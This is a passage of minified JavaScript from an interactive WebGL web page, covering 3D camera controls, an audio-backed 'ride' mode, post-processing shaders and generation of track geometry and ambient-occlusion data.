h=[j.pageX,j.pageY,j.clientX,j.clientY];this.phiT-=(h[0]-f[0])*0.005;this.thetaT=Math.min(π/2*0.9,Math.max(-π/2*0.9,this.thetaT+(h[1]-f[1])*0.005));f=h}}.bind(this));window.addEventListener("scroll",this.handlers.window.scroll=function(h){g()});document.addEventListener("keydown",this.handlers.document.keydown=function(h){if(!this.controls){return}switch(h.keyCode){case 68:this.phiDelta=-1;break;case 65:this.phiDelta=1;break;case 87:this.thetaDelta=-1;break;case 83:this.thetaDelta+=1;break;case 81:this.orbitFactor=1;break;case 69:this.orbitFactor=-1;break}}.bind(this));document.addEventListener("keyup",this.handlers.document.keyup=function(h){if(h.keyCode==13||h.keyCode==32||h.keyCode==27){this.stopRide()}if(!this.controls){return}switch(h.keyCode){case 68:case 65:this.phiDelta=0;break;case 87:case 83:this.thetaDelta=0;break;case 81:case 69:this.orbitFactor=0;break}}.bind(this));this.pointerPunch=document.querySelector(".pointer-punch");this.bound=true},unbind:function(){for(var a in this.handlers){var c=this.handlers[a];for(var b in c){window[a].removeEventListener(b,c[b])}}document.body.style.cursor="default";this.bound=false},updateCameraState:function(a){a.updateProjectionMatrix();a.updateMatrixWorld();a.matrixWorldInverse.getInverse(a.matrixWorld)},update:function(ad){this.tracks=ad.tracks;this.visualizer=ad.visualizer;var A=ad.scene;var ap=ad.camera;var T=ad.scroll;var ao=ad.tracks;var au=this.v1;var at=this.v2;var ar=this.v3;var an=this.v4;var ai=this.m1;var ah=this.m2;if(!this.bound){return this.updateCameraState(ap)}var j=Math.max(0,Math.min(1,(T.y-100)/Math.max(100,this.pageStart-300)));var J=0.5-0.5*Math.cos(j*3.1415);var M=J*0.8+0.2;var W=0.05;this.thetaT=Math.min(π/2*0.9,Math.max(-π/2*0.9,this.thetaT+W*this.thetaDelta));this.phiT+=W*this.phiDelta;this.orbitT=Math.min(1.6,this.orbitT*pow(1.07,this.orbitFactor));this.thetaA=this.thetaA+(this.thetaT-this.thetaA)*0.2;this.thetaB=this.thetaB+(this.thetaA-this.thetaB)*0.2;this.theta=this.thetaB*(1-J);this.phiA=this.phiA+(this.phiT-this.phiA)*0.2;this.phiB=this.phiB+(this.phiA-this.phiB)*0.2;this.phi=this.phiB+this.phiC*(1-J);this.orbitA=this.orbitA+(this.orbitT-this.orbitA)*0.2;this.orbitB=this.orbitB+(this.orbitA-this.orbitB)*0.2;this.orbit=(this.orbitB+(1-this.orbitB)*J)*this.orbitC;this.intro(ap,ad.time);var X=this.scrollEase;var S=this.scrollEaseRatio;function aq(e){var c=e/X;c=(c<0.5?c*c:c-0.25)*X;return c+(e-c)*S}ad.heroAbsScale=(1+(1/this.overlayScale-1)*J)*0.8;if(Time.isSlow()&&(ad.visualizer.playing||this.tracks.tracks[0].speed>0||this.tracks.blackhole>0.1)){this.slowFrames++;(this.slowFrames==120)&&achievement&&achievement("bllt")}else{this.slowFrames=0}if(!this.audioWaiting&&this.ride){try{this.audio.volume=Acko.globalVolume}catch(ak){}var O=this.audio.currentTime==0?0:ad.delta/Time.getSpeed();O=Math.max(0.00001,O);ao.visibleHolder.add(ap);var am=this.rides[this.activeRide];var f=0;if(am&&this.travel!=null){var U=am[7];var l=U?-1:1;var B=U?am[2]:am[3];if(this.travel*l>B*l){f+=Math.abs(this.travel-B);am=this.cycleRide()}}var I=am[0];var aj=am[1]?-1:1;U=am[7];l=U?-1:1;var F=am[7]?am[3]:am[2];var R=am[4];var H=am[5];var z=Math.min(1/10,O)/0.016/Time.getSpeed();var j=Math.pow(am[6]*2,1/z);var ac=am[8]||[0,0,0];var Z=!am[9];var t=ao.tracks[I];var K=180*O*l;var N=175*l;var ae;t.priority=this.cuts;if(!this.ridePos){this.travel=F+f;var af=1/Math.max(0.25,j);ae=t.getMatrices(t.lengthMap.map(this.travel-K*af));ai.copy(ae.mat4);ae=t.getMatrices(t.lengthMap.map(this.travel+N-K*af));ah.copy(ae.mat4);at.set(ai.elements[4]*R*aj,ai.elements[5]*R*aj,ai.elements[6]*R*aj);au.set(ai.elements[12],ai.elements[13],ai.elements[14]).add(at);ar.set(ah.elements[12],ah.elements[13],ah.elements[14]).add(at);ar.x+=ac[0];ar.y+=ac[1];ar.z+=ac[2];this.ridePos=_v().copy(au);this.rideTarget=_v().copy(ar);this.rideUp=_v().copy(at)}ae=t.getMatrices(t.lengthMap.map(this.travel));ai.copy(ae.mat4);ae=t.getMatrices(t.lengthMap.map(this.travel+N));ah.copy(ae.mat4);this.travel+=K;at.set(ai.elements[4]*R*aj,ai.elements[5]*R*aj,ai.elements[6]*R*aj);au.set(ai.elements[12],ai.elements[13],ai.elements[14]).add(at);ar.set(ah.elements[12],ah.elements[13],ah.elements[14]).add(at).sub(au);an.set(ai.elements[4]*aj,ai.elements[5]*aj,ai.elements[6]*aj);var al=ar.dot(an)/ar.length();var E=1;if(Z&&(al<0)){E=Math.max(0.2,1+al*0.2-al*al*0.6);var L=N*E;matrices2=t.getMatrices(t.lengthMap.map(this.travel+L));ah=matrices2.mat4}ar.set(ah.elements[12],ah.elements[13],ah.elements[14]).add(at);ar.x+=ac[0];ar.y+=ac[1];ar.z+=ac[2];this.ridePos.lerp(au,j);this.rideTarget.lerp(ar,j);this.rideUp.lerp(at,j/6/(3+E)*4);var ae=ap.matrix;ae.set(1,0,0,this.ridePos.x,0,1,0,this.ridePos.y,0,0,1,this.ridePos.z,0,0,0,1);ae.lookAt(this.ridePos,this.rideTarget,this.rideUp);ap.fov=this.fov*H;ap.matrixAutoUpdate=false;ap.matrixWorldNeedsUpdate=true}else{var ag=ad.viewHeight;ap.fov=this.fov;this.perspective=0.5/Math.tan(THREE.Math.degToRad(ap.fov*0.5))*ag;var C=Math.cos(this.theta);var g=Math.sin(this.theta);var G=Math.cos(this.phi);var q=Math.sin(this.phi);var Q=(T.x||0);var P=-(aq(T.y)||0);var ab=this.orbit*this.heroScale*this.orbitScale;var Y=this.perspective;Y=ab+(Y-ab)*M;Y=Math.min(2400,Y);var V=Y*C;A.add(ap);ap.matrixAutoUpdate=true;ap.position.copy(this.center).multiplyScalar(1-J);ap.position.x+=V*q;ap.position.z+=V*G;ap.position.y+=Y*g;au.copy(this.lookAt).multiplyScalar(1-J);ap.lookAt(au);ap.position.x+=Q-(P*g*q)-J*20+(1-J)*140;ap.position.y+=P*C;ap.position.z-=P*g*G}if(this.last&&T.y!=0){var b=T.y-this.last.y;if(T.y>this.pageStart*1.5+200){this.scnt=0}if(Math.abs(b)>0){if(b*this.sacc>=0){this.sacc+=b}else{if(T.y>ad.pageStart){this.shdr=Math.max(this.shdr-1,0)}else{this.shdr+=2}if(Math.abs(this.sacc)>50){this.scnt++;if(this.scnt%this.bounceLimit==0){if(this.shdr>3){this.bounceLimit=12;this.shdr=0;achievement&&achievement("prllx");this.controls=true;this.visualizer.start()}this.scnt=0}}else{this.scnt=Math.max(0,this.scnt-1)}this.sacc=0}this.stopRide()}}this.last=T;ad.ride=this.ride;ad.audio=this.audio;ad.cameraLerp=j;var D=265.7;var u=280.5;if(this.audio){var aa=this.audio.currentTime;if(this.lastAudio<=D&&aa>D){achievement&&achievement("dm")}if(this.lastAudio<=u&&aa>u){this.audio.currentTime+=10}this.lastAudio=aa}var w=ad.pastMasthead=this.last&&(this.last.y>ad.pageStart);var k=ad.pastHalfMasthead=(this.last.y>this.pageStart/2);var j=this.forceLock||0.1;if(w||this.forceLock){this.thetaT=this.thetaT+(this.thetaI-this.thetaT)*j}if(this.forceLock||(k&&this.cameraLock)){this.phiDelta=0;this.thetaDelta=0;this.orbitFactor=0;function a(c){return(((c+π)%τ)+τ)%τ-π}this.phiT=a(this.phiT)*(1-j);this.phiA=a(this.phiA);this.phiB=a(this.phiB)}this.updateCameraState(ap)},lock:function(a){if(a!==undefined){this.forceLock=a}return this.forceLock},intro:function(b,c){if(c>8.05){this.lookAt.x=0;this.lookAt.y=0;this.center.x=0;this.center.y=0;this.center.z=0;return}var a=Math.max(0,8-c)*0.303125;a=(a<0.5?a*a:a-0.25)*4;this.lookAt.x=-a*a*6;this.lookAt.y=-a*18;this.center.x=-a*50;this.center.z=-a*a*10;this.center.y=a*52},stopRide:function(){if(!this.ride){return}this.ride=false;this.ridePos=null;this.fadeAudio();var a;while(a=this.growlCancel.pop()){a()}this.tracks.override(false);this.parent.resize(true)},cycleRide:function(){var a=this.rides.length;this.activeRide=(this.activeRide+1)%a;this.travel=null;this.ridePos=null;this.rideTarget=null;this.rideUp=null;this.cuts++;return this.rides[this.activeRide]},runRide:function(){if(this.ride){return}gl.exports.scrollController.set(0,0);this.ignoreClicks=1;this.ride=true;this.activeRide=-1;this.cycleRide();this.scnt=0;this.visualizer.stop();this.tracks.override(true);this.injectAudio()},resize:function(b){var f=b.camera;var a=b.viewWidth;var e=b.viewHeight;f.aspect=b.aspect;this.heroScale=Math.max(1,e/a*1.9);b.overlayScale=this.overlayScale=Math.max(960/a,1);this.scrollEase=e*this.scrollEaseRange;this.heroHeight=this.scrollEase/2;this.heroMargin=140;this.pointerPunch.style.paddingBottom=(this.heroHeight*0.65)+"px";b.heroMargin=this.heroMargin;b.pageStart=this.pageStart=this.heroHeight+this.heroMargin+Math.max(0,b.viewHeight-940)/4;this.container.style.top=Math.round(this.pageStart)+"px";b.cameraScrollYOffset=(1-this.scrollEaseRatio)*0.25*this.scrollEase},injectAudio:function(){if(this.audio){return}var c=this.audio=new Audio();var b;var a=[["audio/ogg","/audio/this-world.ogg"],["audio/mpeg","/audio/this-world.mp3"],];a.forEach(function(e){if(c.canPlayType(e[0])){b=e[1]}});if(!b){growl({type:"info",text:"Your browser does not support MP3 or OGG audio playback."});return}c.autoplay=true;c.style.display="none";c.src=b;this.audioWaiting=true;c.addEventListener("play",function(){this.audioWaiting=false;c.currentTime=0;this.growlCancel.push(growl({type:"info",text:"Scroll down to stop",}));this.growlCancel.push(growl({type:"music",text:"<strong>Selah Sue</strong><br>This World",delay:1000,link:"http://www.selahsue.com/",}))}.bind(this));c.addEventListener("ended",function(){this.audioWaiting=true;this.cycleRide();this.activeRide=0;c.play()}.bind(this));document.body.appendChild(c)},fadeAudio:function(){var b=this.audio;this.audio=null;var c=1;var a=setInterval(function(){c=c*0.95;b.volume=c*Acko.globalVolume;if(c<0.001){b.pause();document.body.removeChild(b);clearInterval(a)}},15)},});Acko.Effects.push(new Acko.Effect.Camera());(function(){var a=navigator.userAgent.match(/Android/);if(a){Acko.Effect.Camera.camera=new THREE.PerspectiveCamera(45,1,500,10000)}else{Acko.Effect.Camera.camera=new THREE.PerspectiveCamera(45,1,2,17000)}})();Acko.Effect.Compose=function(){Acko.Effect.call(this);this.order=100;this.ssao=false;this.fxaa="auto";this.msaa=false;this.eightbit=false;this.white=new THREE.Color(16777215)};Acko.Effect.Compose.prototype=_.extend(new Acko.Effect(),{build:function(f){f.compose=this;var g=f.context;this.msaa=g.getParameter(g.SAMPLES);var h=f.scene;var l=f.camera;var m=f.renderer;var e=this.ssaoStage=new ThreeRTT.Stage(m,{history:-1,width:1,height:1,texture:{magFilter:THREE.NearestFilter,minFilter:THREE.NearestFilter,},});var k=Acko.SSAOShader;var p=this.ssaoMaterial=new ThreeRTT.ShaderMaterial(e,k.vertexShader,k.fragmentShader,[],k.uniforms);p.depthTest=false;p.depthWrite=false;e.fragment(p);var a=this.composer=new THREE.EffectComposer(m);var b=this.render=new THREE.RenderPass(h,l);b.clearAlpha=0;a.addPass(b);var c=this.fxaaEffect=new THREE.ShaderPass(THREE.FXAAShader);a.addPass(c);var q=this.ssaoEffect=new THREE.CallbackPass(this.ssaoPass.bind(this));a.addPass(q);var o=this.ssaoScaler=new THREE.ShaderPass(Acko.SSAOUpShader);a.addPass(o);var j=this.eightBitEffect=new THREE.ShaderPass(Acko.EightBitShader);j.renderToScreen=true;a.addPass(j)},ssaoPass:function(a,b){this.ssaoMaterial.uniforms.tDiffuse.value=b;this.ssaoStage.render()},depthPass:function(b,c,a){b.render(c,a,this.depthTarget)},update:function(b){var e=b.scene;var o=b.depthScene;var h=b.camera;var j=b.renderer;var c=this.ssao&&!b.pastMasthead;var l=this.eightbit;var f=(this.fxaa=="auto")?(c||l||!this.msaa):this.fxaa;var p=this.ssaoEffect;p.enabled=c;var k=this.ssaoScaler;k.enabled=c;k.renderToScreen=!l;var a=this.fxaaEffect;a.enabled=f;a.renderToScreen=!c&&!l;var g=this.eightBitEffect;g.enabled=l;j.setClearColor(16777215,1);if(c){this.depthPass(j,o,h);var m=this.ssaoMaterial;m.uniforms.cameraNear.value=h.near;m.uniforms.cameraFar.value=h.far;m.uniforms.seed.value=b.scroll.y;k.uniforms.cameraNear.value=h.near;k.uniforms.cameraFar.value=h.far}this.render.clearColor=this.white;if((c||f||l)){this.composer.render()}else{j.render(e,h)}b.ambientCorrection=this.ssao?0:-0.1},resize:function(h){if(this.depthTarget){this.depthTarget.dispose()}var e=h.renderer.devicePixelRatio;var a=h.width;var m=h.height;var g=h.viewHeight;var j=this.eightBitEffect;j.uniforms.resolution.value.set(1/a/e,1/m/e);j.uniforms.pixelSize.value=12*m/g;var f=this.depthTarget=new THREE.WebGLRenderTarget(a,m,{minFilter:THREE.NearestFilter,magFilter:THREE.NearestFilter,format:THREE.RGBAFormat,});var b=this.fxaaEffect;b.uniforms.resolution.value.set(1/a/e,1/m/e);var c=this.ssaoStage;c.size(a/2*e,m/2*e);var l=this.ssaoMaterial;l.uniforms.tDepth.value=f;l.uniforms.size.value.set(a/2*e,m/2*e);l.uniforms.resolution.value.set(2/a/e,2/m/e);var k=this.ssaoScaler;k.uniforms.tDepth.value=f;k.uniforms.tAO.value=c.read();k.uniforms.size.value.set(a/2*e,m/2*e);k.uniforms.resolution.value.set(2/a/e,2/m/e);this.composer.setSize(a,m)},});Acko.Effects.push(new Acko.Effect.Compose());Acko.Effect.Tracks=function(){Acko.Effect.call(this);this.order=1;this.group=null;this.depthGroup=null;this.nSegments=256;this.blackholeCenter=_v(285,-95-10/0.8,110+200/0.8);this.blackhole=0;this.blackholeA=0;this.blackholeB=0;this.debug=0;this.debugA=0;this.debugB=0;this.trackData=Acko.TrackData};(function(f){var j=_v();var h=_v();var g=_v();var e=_v();var b=_v();var a=_v();var u=_v();var t=_v();var s=_v();var r=_v();var q=_v();var c=new THREE.Matrix4();f.prototype=_.extend(new Acko.Effect(),{build:function(z){z.tracks=this;var C=z.renderer;var B=z.scene;var D=z.depthScene;var A=z.context;var x=this.visibleGroup=new THREE.Object3D();B.add(x);var y=this.depthGroup=new THREE.Object3D();D.add(y);var E=this.visibleHolder=new THREE.Object3D();E.position.x=0;E.position.y=-10;E.position.z=200;x.add(E);var w=this.depthHolder=new THREE.Object3D();w.position.x=0;w.position.y=-10;w.position.z=200;y.add(w);this.prepareTracks();this.prepareAO();this.prepareTexture(A);this.prepareGeometry();this.prepareMesh();this.prepareWriter(A);window.addEventListener("message",function(F){d=F.data;if(d&&(d=d.mathBoxDirector)&&d.method=="go"){v=Math.max(0,Math.min(1,d.args[0]-1));this.debug=v;z.masthead.showTitle=1-v;z.masthead.showArrow=1-v}}.bind(this))},prepareTracks:function(){var w=this.nSegments;this.trackPages=[];this.tracks=[];this.width=0;this.height=w;this.trackData.forEach(function(y){var x=new f.Track(y,w);this.tracks.push(x);this.trackPages.push(this.width/2);if(!x.dead){this.width+=x.getN()*2}}.bind(this));this.nTris=this.width*this.height;this.nVerts=this.width*this.height/2},prepareAO:function(){if(!this.tracks.length){return}if(Acko.AOData){this.importAO(Acko.AOData)}else{this.AO=new f.AmbientOcclusion();this.AO.build(this.tracks);this.AO.compute();var w;w=this.tracks[13].AODiscs;w[88].front+=0.1*1.2;w[90].front+=0.25*1.2;w[92].front+=0.3*1.2;w[94].front+=0.25*1.2;w[96].front+=0.15*1.2;w[89].front+=0.1*1.2;w[91].front+=0.15*1.2;w[93].front+=0.15*1.2;w[95].front+=0.1*1.2;w=this.tracks[12].AODiscs;w[54].back-=0.06*1.15;w[54].back-=0.06*1.15;w[55].back-=0.12*1.15;w[55].back-=0.12*1.15;w[56].back-=0.18*1.15;w[57].back-=0.18*1.15;w[58].back-=0.24*1.15;w[59].back-=0.25*1.15;w[60].back-=0.17*1.15;w[61].back-=0.18*1.15;w[62].back-=0.12*1.15;w[63].back-=0.14*1.15;w[64].back-=0.05*1.15;w[65].back-=0.06*1.15;w[67].back-=0.03*1.15;w=this.tracks[2].AODiscs;w[61].front+=0.3;w[63].front+=0.25;w[65].front+=0.15;w[62].front+=0.25;w[64].front+=0.2;w[66].front+=0.1}},prepareTexture:function(C){var y=this.texture=C.createTexture();C.bindTexture(C.TEXTURE_2D,y);C.pixelStorei(C.UNPACK_ALIGNMENT,1);C.texParameteri(C.TEXTURE_2D,C.TEXTURE_WRAP_S,C.CLAMP_TO_EDGE);C.texParameteri(C.TEXTURE_2D,C.TEXTURE_WRAP_T,C.CLAMP_TO_EDGE);C.texParameteri(C.TEXTURE_2D,C.TEXTURE_MIN_FILTER,C.NEAREST);C.texParameteri(C.TEXTURE_2D,C.TEXTURE_MAG_FILTER,C.NEAREST);var x=this.width;var z=this.height;var B=new Float32Array(x*z*4);C.texImage2D(C.TEXTURE_2D,0,C.RGBA,x,z,0,C.RGBA,C.FLOAT,B);var A=this.textureObject=new THREE.Texture(new Image(),new THREE.UVMapping(),THREE.ClampToEdgeWrapping,THREE.ClampToEdgeWrapping,THREE.NearestFilter,THREE.NearestFilter);A.__webglInit=true;A.__webglTexture=this.texture},prepareGeometry:function(w){this.geometry=this.makeGeometry(w);this.depthGeometry=this.makeGeometry(w)},makeGeometry:function(z){var E=new THREE.BufferGeometry();E.attributes={index:{itemSize:1,array:new Uint16Array(this.nTris*3),},position:{itemSize:3,array:new Float32Array(this.nVerts*3),},color:{itemSize:3,array:new Float32Array(this.nVerts*3),},};var G=this.width;var A=this.height;var K=1/G;var J=1/A;var F=this.nSegments;var B=E.attributes.position.array;var C=E.attributes.index.array;var x=E.attributes.color.array;var y=K/2;var D=0,I=0,H=0;_.each(this.tracks,function(w){var T=w.getN();var O=w.getColor().clone().convertGammaToLinear();for(var P=0,Q=J/2;P<F;++P,Q+=J){for(var S=0,R=y;S<T;++S,D+=3,R+=K*2){B[D]=R;B[D+1]=Q;B[D+2]=0;x[D]=O.r;x[D+1]=O.g;x[D+2]=O.b}}y+=w.getN()*2*K;var L=T;var N=true;for(var P=0;P<F;++P){if(P==F-1){L=T*(1-F)}var M=1;for(var S=0;S<T;++S,I+=6,++H){if(S==T-1){M=1-T}if(N){C[I]=H;C[I+1]=H+M+L;C[I+2]=H+L;C[I+3]=H;C[I+4]=H+M;C[I+5]=H+M+L}else{C[I]=H;C[I+1]=H+M;C[I+2]=H+L;C[I+3]=H+M;C[I+4]=H+M+L;C[I+5]=H+L}if((S+1)%2==0){N=!N}}}});return E},prepareMesh:function(){var z=Acko.TrackShader;var y=this.material=new THREE.ShaderMaterial(z);y.uniforms.tGeometry.value=this.textureObject;y.uniforms.sampleStep.value.set(1/this.width,1/this.height);var A=this.mesh=new THREE.Mesh(this.geometry,this.material);A.frustumCulled=false;A.renderDepth=-20000;this.visibleHolder.add(A);var x=this.depthMaterial=p(y);var w=this.depthMesh=new THREE.Mesh(this.depthGeometry,this.depthMaterial);w.frustumCulled=false;w.renderDepth=-20000;this.depthHolder.add(w)},prepareWriter:function(A){var w=0;this.setPage=function(C){var B=this.trackPages[C];w=B*2;return B};var z=true;var y=this.texture;this.bindTexture=function(){z=true};var x=0;this.writeCallback=function(E,B,F,C,D){if(z){A.bindTexture(A.TEXTURE_2D,y);A.pixelStorei(A.UNPACK_ALIGNMENT,1);z=false}B+=w;if((F+D)>this.height){console.assert(false)}A.texSubImage2D(A.TEXTURE_2D,0,B,F,C,D,A.RGBA,A.FLOAT,E)}.bind(this);this.prioritySort=function(C,B){return B.priority-C.priority}},updateTrackTexture:function(A,D){var y=this.nSegments;this.bindTexture();var z=[];var C=this.tracks.length;for(var x=0;x<C;++x){var w=this.tracks[x];if(w.dead){continue}var B=this.setPage(x);w.update(A,D,this.writeCallback);(z=z.concat(w.getGeometryOffsets(B*y)))}z.sort(this.prioritySort);this.geometry.offsets=z;this.depthGeometry.offsets=z},update:function(z){if(!this.tracks.length){return}this.mesh.visible=!z.pastMasthead||(z.visualizer.playing&&z.visualizer.slerpB<0.9);this.updateTrackTexture(z.time,z.delta);var B=this.material.uniforms;var x=this.depthMaterial.uniforms;var C=z.heroAbsScale||1;B.ambientCorrection.value=z.ambientCorrection||0;B.opacity.value=z.ride?z.backgroundOpacity:1;var y=this.tracks[0];B.ambientOcclusion.value=Math.min(1,Math.max(0,1-(Math.abs(y.initial-y.travel)-1500)/3300))*0.5+0.5;var A=Math.pow(0.12,3/(1+2*Time.getSpeed()));var D=z.ride?0:this.blackhole*2.85;this.blackholeA=this.blackholeA+(D-this.blackholeA)*A;this.blackholeB=this.blackholeB+(this.blackholeA-this.blackholeB)*A;var w=this.blackholeB;w=0.7+(w<0.5?w*w:w-0.25);B.blackhole.value=w;x.blackhole.value=w;B.fogBegin.value=2200*(1+z.overlayScale)/2;c.getInverse(this.mesh.matrixWorld);j.copy(this.blackholeCenter).multiplyScalar(C).applyMatrix4(c);B.center.value.copy(j);this.visibleHolder.scale.set(C,C,C);this.depthHolder.scale.set(C,C,C);A/=2;this.debugA=this.debugA+(this.debug-this.debugA)*A;this.debugB=this.debugB+(this.debugA-this.debugB)*A;B.displacement.value=this.debugB},override:function(x){if(!this.tracks.length){return}if(x!==undefined){for(var w=0;w<this.tracks.length;++w){this.tracks[w].override=x}}return this.tracks[0].override},exportTexture:function(){var x=new THREE.MeshBasicMaterial({color:16777215,map:this.textureObject,fog:false});x.side=THREE.DoubleSide;var y=new THREE.RoundRectGeometry(this.width,this.height,7,6,true);var w=new THREE.Mesh(y,x);return{object:w,width:this.width,height:this.height,}},exportTracks:function(){var E=this.nSegments;var x=new THREE.Object3D();var B=new THREE.Geometry();var y=new THREE.Geometry();var G=new THREE.Geometry();var w=B.vertices;var F=G.vertices;var A=y.vertices;this.tracks.slice(0,-6).forEach(function(K,L){var I=K.relative;if(L==1||L==3||L==5){return}var P=K.points.map(function(Q){return l(Q[0].clone().add(I))}).slice(1,-1);var N=K.path.vertices.slice(1,-1);var O=K.path.normals.slice(1,-1);if(L==4){P=P.slice(2);N=N.slice(5);O=O.slice(5)}if(L==8){N=N.slice(0,-20);O=O.slice(0,-20)}var H=_v(0.3,0.5,0),J;for(L in P){if(L>0){w.push(P[L-1]);w.push(P[L])}}for(L in N){var M=N[L];if(L>0){A.push(N[L-1]);A.push(M)}j.copy(O[L]).multiplyScalar(25);F.push(M.clone());F.push(M.clone().add(j))}}.bind(this));B.computeBoundingSphere();G.computeBoundingSphere();y.computeBoundingSphere();var D=new THREE.Line(B,new THREE.LineBasicMaterial({color:Acko.Palette.blue[1],linewidth:2,}));D.renderDepth=1;D.type=THREE.LinePieces;var z=new THREE.Line(y,new THREE.LineBasicMaterial({color:Acko.Palette.blue[0],linewidth:2,}));z.renderDepth=3;z.type=THREE.LinePieces;var C=new THREE.Line(G,new THREE.LineBasicMaterial({color:Acko.Palette.platinum[0],linewidth:1,}));C.renderDepth=4;C.type=THREE.LinePieces;x.add(D);x.add(z);x.add(C);return{object:x,width:960,height:500,}},exportDiscs:function(){var w=k(this.tracks,Acko.Palette.blue[1],Acko.Palette.blue[0]);return{object:w,width:960,height:500,}},importAO:function(y){try{y=JSON.parse(y)}catch(D){return}var H=null;var B,z,A,x,E;for(A in y){var G=y[A];var w=this.tracks[A];if(G){var B=[];w.AOStart=G[0];w.AOEnd=G[1];w.AOStep=G[2];var C=G[3];var F=G[4];for(x in F){E=F[x];z=new f.Disc(_v(E[0],E[1],E[2]),_v(E[3],E[4],E[5]),C,1);z.front=E[6];z.back=E[7];B.push(z)}w.AODiscs=B;H=w}else{w.AOStart=H.AOStart;w.AOEnd=H.AOEnd;w.AOStep=H.AOStep;w.AODiscs=H.AODiscs}}},exportAO:function(){var w=null;var x=this.tracks.map(function(B,y){if((!w||(w!=B.AODiscs))&&B.AODiscs){w=B.AODiscs;var A=[],z;for(i in B.AODiscs){var z=B.AODiscs[i];A.push([z.position.x,z.position.y,z.position.z,z.normal.x,z.normal.y,z.normal.z,z.front,z.back])}return[B.AOStart,B.AOEnd,B.AOStep,z.radius,A]}else{w=null;return null}});return JSON.stringify(x).replace(/([1-9][0-9]{2,})\.([0-9]+)/g,"$1").replace(/([1-9][0-9])\.([0-9])([0-9]*)/g,"$1.$2").replace(/([1-9])\.([0-9]{2})([0-9]*)/g,"$1.$2").replace(/(0\.[0-9]{3})([0-9]+)/g,"$1").replace(/0\.0+([,}])/g,"0$1").replace(/[0-9]+\.[0-9]+e-[0-9]+/g,0)},});f.Track=function(z,x){this.nSegments=x;var A=z||{};this.nProfile=A.n||8;this.width=A.width||100;this.height=A.height||50;this.power=A.power||0.25;this.points=A.points||[];this.arrow=A.arrow||0;this.shift=A.shift||0;this.truncate=A.truncate||0;this.aspect=A.aspect||1;this.smooth=A.smooth||0;this.spring=A.spring||0.3;this.up=A.up||_v(0,1,0);this.detail=A.detail||5;this.relative=A.relative||_v(0,0,0);this.color=A.color||new THREE.Color(16777215);this.bend=A.bend||3;this.edge=A.edge||2;this.dead=A.dead||false;this.AOStep=A.AOStep||null;this.castAO=A.castAO===undefined?1:A.castAO;this.receiveAO=A.receiveAO===undefined?1:A.receiveAO;this.lengthAO=A.lengthAO;this.travelAO=A.travelAO;this.bank=A.bank===undefined?true:A.bank;this.warp=A.warp===undefined?true:A.warp;this.refine=A.refine===undefined?true:A.refine;this.simplify=A.simplify===undefined?true:A.simplify;this.detail=Math.max(this.detail,10)*1.1;this.smooth*=1.1;this.travel=A.travel||0;this.length=A.length||50;this.travelOverride=A.travelOverride||this.travel;this.lengthOverride=A.lengthOverride||this.length;this.override=false;this.speed=A.speed||600;this.distance=(A.distance||3000)*1.09;this.speed*=1.15;this.duration=(this.distance/Math.max(1,this.speed))+this.bend;this.initial=this.travel;this.profile=o(this.width,this.height,this.power,this.nProfile);this.path=m(this.points,this.detail,this.smooth,this.bank,this.up,this.relative,this.warp,this.spring,this.refine,this.simplify);this.lengthMap=new f.LengthMap(this.path.vertices);this.bufferSize=x;this.buffer=new Float32Array(this.nProfile*4*2*this.bufferSize);this.lastTravel=0;this.lastLength=0;this.priority=f.Track.index--;var y=this.lengthMap;this.lastStartSlot=0;this.lastEndSlot=0;this.startSlot=0;this.endSlot=0;this.range=0;this.slots=[];for(var w=0;w<this.nSegments;++w){this.slots.push(new f.Slot())}this.baseIndex=-1;this.geometryOffsets=[{start:0,index:0,count:0,},{start:0,index:0,count:0,},];this.mat4=new THREE.Matrix4();this.mat3=new THREE.Matrix3();this.prepareGenerator()};f.Track.prototype={prepareGenerator:function(){var w=this.nProfile;var O=this.nSegments;var C=this.bufferSize;var J=this.buffer;var A=this.arrow;var F=this.aspect;var N=this.lengthMap;var H=this.width;var x=this.truncate;var K=this.shift;var D=this.slots;var G=null;var z=0;var B=0;var L=0;var y=Infinity;var E=Infinity;var M=false;function I(P){if(B>0){G(J,0,P,w*2,B)}z=0;B=0}this.beginPass=function(P,Q){L=P;G=Q;M=false};this.endPass=function(){I(L-B)};this.clear=function(R,T){var Q=((R%O)+O)%O;R=Q;for(var S=0;S<T;){D[R].type=-1;this.getBlank(z);z+=w;++B;++S;var P=(Q+S)%O;if(P==0){I(Q);Q=0}R=P}I(Q)};this.nextSlot=function(R,Q,P){var S=D[L];if(!S){return}if(S.offset!==R||S.type!==Q||S.key!==P){Q(R);z+=w;++B;S.offset=R;S.type=Q;S.key=P;M=true}else{M&&I(L-B);M=false}if((B==C)||(L==O-1)){I(L-B+1)}L=(L+1)%O};this.generators={begin:function(P){this.getEnd(P,-1,z)}.bind(this),beginCap:function(P){this.getOutline(P,0,P,-1,0.8,0.8,z)}.bind(this),outline:function(P){this.getOutline(P,0,P,0,1,1,z)}.bind(this),beginArrow:function(P){this.getOutline(N.map(N.unmap(P)+K),-K,P,0,A/H,1,z)}.bind(this),midArrow:function(R){var P=this.arrow/this.aspect;var Q=(P-this.truncate)/2;this.getOutline(N.map(N.unmap(R)+K),Q-K,N.map(N.unmap(R)+Q),0,A/H*(1-Q/P),1,z)}.bind(this),endArrow:function(R){var P=this.arrow/this.aspect;var Q=P-this.truncate;this.getOutline(N.map(N.unmap(R)+K),Q-K,N.map(N.unmap(R)+Q),0,A/H*(1-Q/P),1,z)}.bind(this),endCap:function(P){this.getOutline(P,0,P,1,0.8,0.8,z)}.bind(this),end:function(P){this.getEnd(P,1,z)}.bind(this),}},update:function(C,S,J){var U=this.nSegments;var T=this.lengthMap;var A=(Acko.ReverseTracks?-1:1);if(this.distance){var H=Math.max(0,(this.duration-C)/this.bend);H=(H<0.5?H*H:H-0.25)*this.bend;this.travel=this.initial-H*this.speed*A;if(H==0){this.speed=this.distance=0}}var E=this.override?this.travelOverride:this.travel;var z=Math.max(0,this.override?this.lengthOverride:this.length);z-=this.arrow/this.aspect;var B=(E!=this.lastTravel)||(z!=this.lastLength);if(!B){return}this.lastTravel=E;this.lastLength=z;var I=T.map(E);var Q=Math.max(0,this.truncate-this.arrow/this.aspect);var P=T.map(E+z-Q);var L=this.getPathCount();function D(V){return Math.min(L,Math.max(0,V))}var N=D(Math.floor(I));var w=D(Math.ceil(P));if(this.baseIndex==-1){this.baseIndex=N}var F=N-this.baseIndex;var x=w-this.baseIndex;var R=x-F;x=F+R+(this.arrow?5:4);this.range=x-F;if(this.range>=U){console.warn("Track: Segment limit 